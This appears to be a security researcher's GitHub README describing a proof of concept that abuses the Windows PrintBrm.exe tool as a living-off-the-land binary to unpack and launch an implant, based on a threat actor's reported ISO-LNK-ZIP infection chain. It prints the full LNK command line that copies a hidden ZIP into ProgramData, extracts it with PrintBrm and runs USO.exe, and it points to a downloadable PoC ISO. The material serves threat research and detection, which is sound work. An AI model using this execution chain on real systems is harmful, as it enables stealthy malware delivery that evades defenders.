# Implant execution via PrintBrm.exe #

## About PrintBrm.exe ##

- PrintBrm.exe - Printer Backup Recovery Migration tool
- Path: %windir%\System32\spool\tools\PrintBrm.exe
- Leveraged to extract files from the ZIP Archive
- Thus a ***LOLBIN***

## PoC ##

Came across the following [tweet](https://twitter.com/h2jazi/status/1638923200527474691) in which the Threat Actors used PrintBrm to extract & execute the implant. Considered creating a PoC for it.

***Infection Chain***

- Begins with an ISO file that contains a LNK file as well as a hidden ZIP Archive.
- Once the LNK File is executed
    - It copies the ZIP archive into ProgramData
    - Extracts the files from the Archive using PrintBrm.exe into another folder in ProgramData
    - The extracted file "USO.exe" is the implant, which is then executed by the LNK File.

- ***The proof-of-concept ISO file demonstrating the following infection chain can be downloaded from the "PoC-ISO" Folder***


Argument for LNK File:

```
%windir%/system32/cmd.exe /c xcopy .\USO.zip %programdata% /h /y && %windir%\System32\spool\tools\PrintBrm.exe -r -f %programdata%\USO.zip -d %programdata%\usosharingdriver && start %programdata%\usosharingdriver\USO.exe
```



![1](https://user-images.githubusercontent.com/60843949/227739908-b87b5870-10e5-4fbc-8d08-c7e285284f4b.PNG)

## Usage - PrintBrm.exe ##

```
-r - Restore the configuration in the file to the server.
-f file_name   The backup file.
-d directory   Unpack the backup file to the directory (with -r),
                  or repack a backup file from the directory (with -b).

PrintBrm Commands

Pack the files from the Directory to ZIP

PrintBrm.exe -b -f <out_zip_path> -d <directory_to_pack>

Unpack the ZIP to the Directory

PrintBrm.exe -r -f <unpack_zip_path> -d <unpack_files_directory_path>

```

## References ##

- https://ss64.com/nt/printbrm.html



Ciao! - knight0x07



